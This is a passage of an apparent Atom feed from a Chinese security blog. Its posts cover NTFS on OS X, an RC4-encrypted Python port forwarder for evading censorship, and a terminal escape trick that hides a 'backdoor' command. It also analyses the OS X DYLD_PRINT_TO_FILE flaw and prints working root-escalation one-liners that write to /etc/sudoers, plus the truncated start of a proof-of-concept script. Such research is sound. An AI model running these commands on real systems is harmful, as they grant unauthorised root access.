fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/strong&gt;中提到：&lt;br&gt;“Addresses of commit_creds and prepare_kernel_cred functions are static and can be determined per Linux kernel version/android device.”&lt;br&gt;所以先写了个内核模块获取这俩函数的地址：&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="ubuntu" scheme="https://badb100d.com/tags/ubuntu/"/>
    
      <category term="vulns" scheme="https://badb100d.com/tags/vulns/"/>
    
  </entry>
  
  <entry>
    <title>osx读写ntfs</title>
    <link href="https://badb100d.com/2016/01/24/2016-01-24/"/>
    <id>https://badb100d.com/2016/01/24/2016-01-24/</id>
    <published>2016-01-24T11:05:00.000Z</published>
    <updated>2016-01-24T11:05:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>作为国际大厂，苹果故意不支持巨硬家的ntfs文件系统未免有点小心眼。<br>升了el capitan后希捷自家的ntfs支持软件不能用了，只好寻求其他写入ntfs的方式。<br>google一番找到了个不算优雅但还凑合的方案，在此记录一下。</p><p>接入ntfs移动硬盘root shell编辑/etc/fstab内容<br>如：<br>LABEL=DRIVE_NAME none ntfs rw,auto,nobrowse<br>其中DRIVE_NAME是连入设备的卷标，注意若卷标含空格则使用“\ ”转义符。<br>此时重连设备可在/Volumes下看到卷。<br>这种方法无法在GUI环境读写磁盘文件，但是能在终端下操作，只能说凑合能用。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作为国际大厂，苹果故意不支持巨硬家的ntfs文件系统未免有点小心眼。&lt;br&gt;升了el capitan后希捷自家的ntfs支持软件不能用了，只好寻求其他写入ntfs的方式。&lt;br&gt;google一番找到了个不算优雅但还凑合的方案，在此记录一下。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="tools" scheme="https://badb100d.com/tags/tools/"/>
    
      <category term="osx" scheme="https://badb100d.com/tags/osx/"/>
    
      <category term="macos" scheme="https://badb100d.com/tags/macos/"/>
    
  </entry>
  
  <entry>
    <title>python asyncore实现端口转发</title>
    <link href="https://badb100d.com/2015/10/01/2015-10-01/"/>
    <id>https://badb100d.com/2015/10/01/2015-10-01/</id>
    <published>2015-10-01T09:28:00.000Z</published>
    <updated>2015-10-01T09:28:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近Digital Ocean的VPS直连一直连不上，怀疑是功夫王根据ssh的流量特征做了拦截，遂写了个脚本实现RC4加密的端口转发(主要目的是规避流量特征的分析)。<br>python的asyncore库是一个异步的socket通信库。<br>一个简单的使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncore, socket</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPClient</span>(<span class="params">asyncore.dispatcher</span>):</span>              <span class="comment"># 继承dispatcher类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, path</span>):</span></span><br><span class="line">        asyncore.dispatcher.__init__(self)</span><br><span class="line">                                                    <span class="comment"># 这个示例是client端</span></span><br><span class="line">        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.connect( (host, <span class="number">80</span>) )</span><br><span class="line">        self.buffer = <span class="string">&#x27;GET %s HTTP/1.0\r\n\r\n&#x27;</span> % path</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_connect</span>(<span class="params">self</span>):</span>                       <span class="comment"># 此成员在连接成功时被调用</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_close</span>(<span class="params">self</span>):</span>                         <span class="comment"># 远程关闭时被调用</span></span><br><span class="line">        self.close()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_read</span>(<span class="params">self</span>):</span>                          <span class="comment"># 默认情况下loop会循环调用此函数，可自定义readable成员实现条件控制</span></span><br><span class="line">        <span class="built_in">print</span> self.recv(<span class="number">8192</span>)                       <span class="comment"># 应该会阻塞在这</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writable</span>(<span class="params">self</span>):</span>                             <span class="comment"># 可发送的条件控制成员</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">len</span>(self.buffer) &gt; <span class="number">0</span>)               <span class="comment"># 当发送队列不为空时</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_write</span>(<span class="params">self</span>):</span>                         <span class="comment"># 发送操作调用的回调</span></span><br><span class="line">        sent = self.send(self.buffer)</span><br><span class="line">        self.buffer = self.buffer[sent:]</span><br><span class="line">client = HTTPClient(<span class="string">&#x27;www.python.org&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">asyncore.loop()                                     <span class="comment"># 此调用会在asyncore内部开始异步通信</span></span><br></pre></td></tr></table></figure><p>dispatcher父类中handle开头的成员都是回调类，可在子类中定义回调函数。</p><p>在网上查了一些类似的程序都感觉代码写的不是很好，于是自己查了下manual重新造了遍轮子，发现还是挺别扭😂<br>大致代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket,asyncore,sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line">DEBUG=<span class="literal">False</span></span><br><span class="line">cipher_rc4_obj=<span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Transmiter</span>(<span class="params">asyncore.dispatcher</span>):</span>                  <span class="comment">#数据交换类</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;数据交换类,两个此类的实例可互换tx和rx,若初始化socket则表示server,否则是client&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,socket_info,transmitee=<span class="literal">None</span></span>):</span>     </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;参数为socket_info,另一个交换实例&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;(作为client时socket_info为tuple(ip,port)，作为server时socket_info为accept得到的socket)&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;例如Transmiter((12.34.56.78,8080),transee)实例化了一个client端&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;Transmiter(socket_acptd,transee)实例化了一个server端&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.buf_Tx=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.buf_Rx=<span class="string">&#x27;&#x27;</span>                                              <span class="comment"># Reserved</span></span><br><span class="line">        self.transmitee=transmitee                                  <span class="comment"># transmitee是要与之交换数据的另一个对象</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=transmitee <span class="keyword">and</span> <span class="literal">None</span>==transmitee.transmitee:</span><br><span class="line">            transmitee.transmitee=self                              <span class="comment"># transmitee与本实例交换数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(socket_info,socket.socket):                   <span class="comment"># server</span></span><br><span class="line">            asyncore.dispatcher.__init__(self,socket_info)</span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer server&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(socket_info[<span class="number">0</span>],<span class="built_in">str</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(socket_info[<span class="number">1</span>],<span class="built_in">int</span>):</span><br><span class="line">            asyncore.dispatcher.__init__(self)                      <span class="comment"># client</span></span><br><span class="line">            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment"># 建立套接字</span></span><br><span class="line">            self.connect(socket_info)                               <span class="comment"># (ip,port)</span></span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer client&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_read</span>(<span class="params">self</span>):</span>                  <span class="comment"># 读处理:recv并加入transee的发送队列或丢弃数据</span></span><br><span class="line">        read = self.recv(<span class="number">4096</span>)              <span class="comment"># 有数据可读时将读取的数据加入transee的发送队列，无transee则丢弃</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Read\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.transmitee:</span><br><span class="line">            self.transmitee.buf_Tx += read</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Drop\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writable</span>(<span class="params">self</span>):</span>                     <span class="comment"># 可写判断:检测self的发送队列是否有数据</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">len</span>(self.buf_Tx) &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_write</span>(<span class="params">self</span>):</span>                 <span class="comment"># 写处理:send发送队列，保留未发送成功的部分</span></span><br><span class="line">        sent = self.send(self.buf_Tx)</span><br><span class="line">        self.buf_Tx = self.buf_Tx[sent:]</span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Write\t%d bytes&#x27;</span> % (sent)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_close</span>(<span class="params">self</span>):</span>                 <span class="comment"># 关闭状态处理，关闭self及transee</span></span><br><span class="line">        self.close()                        <span class="comment"># 远端关闭后关闭连接</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer close&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.transmitee:</span><br><span class="line">            self.transmitee.close()</span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer\&#x27;s transee close&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_error</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer error occur&#x27;</span></span><br><span class="line">        self.handle_close()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_expt</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer exception occur&#x27;</span></span><br><span class="line">        self.handle_close()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connector</span>(<span class="params"><span class="built_in">object</span></span>):</span>        <span class="comment"># 如果断开不太好重新建立连接</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,remoteaddr1,remoteaddr2</span>):</span></span><br><span class="line">        self.remoteaddr1=remoteaddr1</span><br><span class="line">        self.remoteaddr2=remoteaddr2</span><br><span class="line">        self.trans1=Transmiter(remoteaddr1)</span><br><span class="line">        self.trans2=Transmiter(remoteaddr2,self.trans1)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listener</span>(<span class="params">asyncore.dispatcher</span>):</span>        <span class="comment"># 两个accepted组成一对trans</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,localaddr,backlog=<span class="number">5</span></span>):</span></span><br><span class="line">        asyncore.dispatcher.__init__(self)</span><br><span class="line">        self.lasttrans=<span class="literal">None</span></span><br><span class="line">        self.create_socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        self.set_reuse_addr()</span><br><span class="line">        self.bind(localaddr)</span><br><span class="line">        self.listen(backlog)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn, addr = self.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;accepted %s&#x27;</span> % <span class="built_in">str</span>(addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>==self.lasttrans:                <span class="comment">#没有上一个trans</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;wait for another&#x27;</span></span><br><span class="line">            self.lasttrans=Transmiter(conn)     <span class="comment">#记录此trans</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;paired to last one&#x27;</span></span><br><span class="line">            Transmiter(conn,self.lasttrans)     <span class="comment">#有记录的trans,配对</span></span><br><span class="line">            self.lasttrans=<span class="literal">None</span>                 <span class="comment">#清除记录</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forwarder</span>(<span class="params">asyncore.dispatcher</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, localaddr, remoteaddr, backlog=<span class="number">5</span></span>):</span></span><br><span class="line">        asyncore.dispatcher.__init__(self)</span><br><span class="line">        self.remoteaddr=remoteaddr</span><br><span class="line">        self.create_socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        self.set_reuse_addr()</span><br><span class="line">        self.bind(localaddr)</span><br><span class="line">        self.listen(backlog)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn, addr = self.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Forward from %s to %s&#x27;</span> % (<span class="built_in">str</span>(addr),self.remoteaddr)</span><br><span class="line">        trans_Acptd=Transmiter(conn)</span><br><span class="line">        trans_toRemote=Transmiter(self.remoteaddr,trans_Acptd)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TransmiterWithCipher</span>(<span class="params">Transmiter</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,socket_info,cipher_obj=<span class="literal">None</span>,isEnc=<span class="literal">False</span>,transmitee=<span class="literal">None</span></span>):</span></span><br><span class="line">        Transmiter.__init__(self,socket_info,transmitee)</span><br><span class="line">        self.cipher_obj=cipher_obj</span><br><span class="line">        self.isEnc=isEnc</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_read</span>(<span class="params">self</span>):</span></span><br><span class="line">        read = self.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Read\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.cipher_obj <span class="keyword">and</span> <span class="literal">False</span>!=self.isEnc:</span><br><span class="line">            read=self.cipher_obj.decrypt(read)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.transmitee:</span><br><span class="line">            <span class="keyword">if</span> <span class="literal">None</span> != self.transmitee.cipher_obj <span class="keyword">and</span> <span class="literal">False</span>!=self.transmitee.isEnc:</span><br><span class="line">                read = self.transmitee.cipher_obj.encrypt(read)</span><br><span class="line">            self.transmitee.buf_Tx +=read</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Drop\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForwarderWithCipher</span>(<span class="params">Forwarder</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, localaddr, remoteaddr, cipher_obj=<span class="literal">None</span>,localenc=<span class="literal">False</span>,remoteenc=<span class="literal">False</span>,backlog=<span class="number">5</span></span>):</span></span><br><span class="line">        self.cipher_obj=cipher_obj</span><br><span class="line">        self.localenc=localenc</span><br><span class="line">        self.remoteenc=remoteenc</span><br><span class="line">        Forwarder.__init__(self, localaddr, remoteaddr, backlog)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn, addr = self.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Forward from %s to %s&#x27;</span> % (<span class="built_in">str</span>(addr),self.remoteaddr)</span><br><span class="line">        trans_Acptd=TransmiterWithCipher(conn,self.cipher_obj,self.localenc)</span><br><span class="line">        trans_toRemote=TransmiterWithCipher(self.remoteaddr,self.cipher_obj,self.remoteenc,trans_Acptd)</span><br></pre></td></tr></table></figure><p>由于是规避流量特征所以拿rc4凑合一下，根据自己的脑洞顺手写了个Connector和Listenner没有测试，拒绝填坑。最后通过其他连接渠道把脚本部到vps后发现直连还是会reset，估计是校长并没有看流量特征直接把vps的C段都断了。 (￣へ￣)<br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2FzeW5jb3JlLmh0bWw=" title="https://docs.python.org/2/library/asyncore.html">ref<i class="fa fa-external-link"></i></span></p><p>发现了个小工具，socat，功能挺多。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近Digital Ocean的VPS直连一直连不上，怀疑是功夫王根据ssh的流量特征做了拦截，遂写了个脚本实现RC4加密的端口转发(主要目的是规避流量特征的分析)。&lt;br&gt;python的asyncore库是一个异步的socket通信库。&lt;br&gt;一个简单的使用示例如下：&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="python" scheme="https://badb100d.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>A shell trick</title>
    <link href="https://badb100d.com/2015/09/30/2015-09-30/"/>
    <id>https://badb100d.com/2015/09/30/2015-09-30/</id>
    <published>2015-09-30T10:09:00.000Z</published>
    <updated>2015-09-30T10:09:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>码瘟给我发了个好玩的东西</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf &#x27;#!/bin/bash\necho doing something evil!\nexit\n\033[2Aecho doing something very nice!\n&#x27; &gt;backdoor.sh</span><br><span class="line">chmod +x backdoor.sh</span><br><span class="line">cat backdoor.sh</span><br><span class="line">./backdoor.sh</span><br></pre></td></tr></table></figure><p>man ascii 查了下\033是ESC，理论上通过这种控制符能玩出很多花样。<br><span class="exturl" data-url="aHR0cHM6Ly96b3JrLm5ldC9+c3Qvam90dGluZ3MvTm90ZXNfb25fVGVybWluYWxfRW11bGF0aW9uLmh0bWw=" title="https://zork.net/~st/jottings/Notes_on_Terminal_Emulation.html">相关链接<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;码瘟给我发了个好玩的东西&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="linux" scheme="https://badb100d.com/tags/linux/"/>
    
      <category term="pentest" scheme="https://badb100d.com/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>Mac OSX yosemite本地提权漏洞</title>
    <link href="https://badb100d.com/2015/08/07/2015-08-07/"/>
    <id>https://badb100d.com/2015/08/07/2015-08-07/</id>
    <published>2015-08-07T10:08:00.000Z</published>
    <updated>2015-08-07T10:08:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>昨晚在<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzc0MTgwLmh0bWw=" title="http://www.freebuf.com/news/74180.html">freebuf<i class="fa fa-external-link"></i></span>上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的<strong>DYLD_PRINT_TO_FILE</strong>环境变量来实现本地提权免密码root安装。<br>脚本思路大致如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;echo \&quot;<span class="subst">$(whoami)</span> ALL=(ALL) NOPASSWD:ALL\&quot; &gt;&amp;3 &quot;</span>|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo -s dosomethingroot</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuYXBwbGUuY29tL2xpYnJhcnkvcHJlcmVsZWFzZS9tYWMvZG9jdW1lbnRhdGlvbi9EYXJ3aW4vUmVmZXJlbmNlL01hblBhZ2VzL21hbjEvZHlsZC4xLmh0bWw=" title="https://developer.apple.com/library/prerelease/mac/documentation/Darwin/Reference/ManPages/man1/dyld.1.html">DYLD<i class="fa fa-external-link"></i></span>全称dynamic link editor，听名字是实现类似动态链接库加载的东西，<strong>DYLD_PRINT_TO_FILE</strong>是苹果在OSX 10.10加入的一个新特性，主要功能是实现将dyld进程的错误日志重定向到此环境变量指定的可写文件。不过添加这个特性的时候貌似没把它加在有安全验证的代码范围内而是直接写在dyld的main里了。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//大致添加的代码</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* loggingPath = _simple_getenv(envp, <span class="string">&quot;DYLD_PRINT_TO_FILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( loggingPath != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, <span class="number">0644</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd != <span class="number">-1</span> ) &#123;</span><br><span class="line">                sLogfile = fd;</span><br><span class="line">                sLogToFile = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                dyld::<span class="built_in">log</span>(<span class="string">&quot;dyld: could not open DYLD_PRINT_TO_FILE=&#x27;%s&#x27;, errno=%d\n&quot;</span>, loggingPath, errno);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码中来看dyld是直接从环境变量中获取<strong>DYLD_PRINT_TO_FILE</strong>的值作为文件路径并append写打开文件，那么问题就来了。。。<br>普通用户可以利用这个变量在系统目录创建文件，或如前面的恶意软件那样修改root的配置文件，或修改SUID的bin文件。<br>更严重的是这个文件的描述符并没有被关闭，特权父进程fork出的子进程都可以对文件进行操作。<br>了解了原理再看恶意软件的代码，脚本首先设置环境变量DYLD_PRINT_TO_FILE，再启动newgrp这个SUID文件来执行echo “string” &gt; &amp;3的操作，此时3通过<strong>DYLD_PRINT_TO_FILE</strong>分配给了sudoers文件，所以结果就是在sudoers的尾部添加了一行针对当前账户的配置，脚本再去执行sudo -s command就没有提示了。<br>google了一番看了些歪果仁写的帖子，以下为两个关于此漏洞的poc脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  EDITOR=/usr/bin/<span class="literal">true</span> DYLD_PRINT_TO_FILE=/this_system_is_vulnerable crontab -e</span><br></pre></td></tr></table></figure><p>这个poc用的是suid的crontab作loader</p><p>下面是一个精彩的poc</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Simple Proof of Concept Exploit for the DYLD_PRINT_TO_FILE</span></span><br><span class="line"><span class="comment"># local privilege escalation vulnerability in OS X 10.10 - 